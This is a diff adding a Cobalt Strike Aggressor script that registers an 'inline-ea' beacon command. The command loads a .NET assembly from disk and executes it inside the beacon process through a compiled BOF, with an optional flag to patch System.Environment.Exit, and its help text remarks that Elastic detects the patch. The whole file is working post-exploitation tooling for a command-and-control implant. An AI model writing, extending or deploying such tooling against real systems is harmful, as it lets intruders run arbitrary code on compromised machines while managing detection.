@@ -1,0 +1,77 @@
+#Register command
+beacon_command_register(
+"inline-ea", 
+"Execute .NET assemblies in the current beacon process. Use optional --patchexit flag as the first or last arg to patch System.Environment.Exit (Note this does get flagged by Elastic)", 
+"Synopsis: inline-ea /path/to/Assembly.exe arguments go here\nUse optional --patchexit flag as the first or last arg to patch System.Environment.Exit (Note this does get flagged by Elastic)");
+
+
+alias inline-ea {
+
+	if (size(@_) < 3)
+	{
+		berror($1, "Invalid number of arguments! (See 'help inline-ea')");
+		return -1;
+	}
+	
+	btask($1, "Tasked beacon to inline execute inline-ea!");
+	$barch = barch($1);
+	$dotnetassembly = $2;
+	
+    $patchExitflag = 0;
+    $result = "";
+    # Check if the first passed argument equals --patchexit
+    if (@_[2] eq "--patchexit") {
+        $patchExitflag = 1;
+        # Collect arguments starting from the element after --patchexit
+        for ($i = 3; $i < size(@_); $i++) {
+            $result .= @_[$i] . " ";
+        }
+    # Otherwise, check if the last passed argument equals --patchexit
+    } else if (@_[size(@_) - 1] eq "--patchexit") {
+        $patchExitflag = 1;
+        # Collect arguments from index 2 up to the element before --patchexit
+        for ($i = 2; $i < size(@_) - 1; $i++) {
+            $result .= @_[$i] . " ";
+        }
+    # If --patchexit isn’t present at either end, process all arguments normally
+    } else {
+        for ($i = 2; $i < size(@_); $i++) {
+            $result .= @_[$i] . " ";
+        }
+    }
+
+    # Remove trailing space if it exists
+    $result = substr($result, 0, -1);
+    $arguments = $result;
+
+
+    #Reading assembly bytes and get the size in bytes
+	$fileHandle = openf($dotnetassembly);
+	$assemblyLength = lof($dotnetassembly);
+	$assemblyBytes = readb($fileHandle, -1);
+	closef($fileHandle);
+	
+	if($assemblyLength < 1)
+	{
+		berror($1,"Error: Specified .NET assembly could not be found. Please ensure the file exists!");
+		return;
+	}
+	println($assemblyLength)
+	
+	# Read BOF file
+	$handle = openf(script_resource("inline-ea.x64.o"));
+	$bof = readb($handle, -1);
+	closef($handle);
+	if(strlen($bof) < 1)
+	{
+		berror($1,"Error: BOF bin could not be found. Please ensure the compiled BOF (.o file) exists in the same folder as this aggressor script");
+		return;
+	}
+
+    # Prepare the arguments
+    $args = bof_pack($1, "biZi", $assemblyBytes, $assemblyLength, $arguments, $patchExitflag);
+    
+    # Call the BOF
+    beacon_inline_execute($1, $bof, "go", $args); # $args
+	
+}
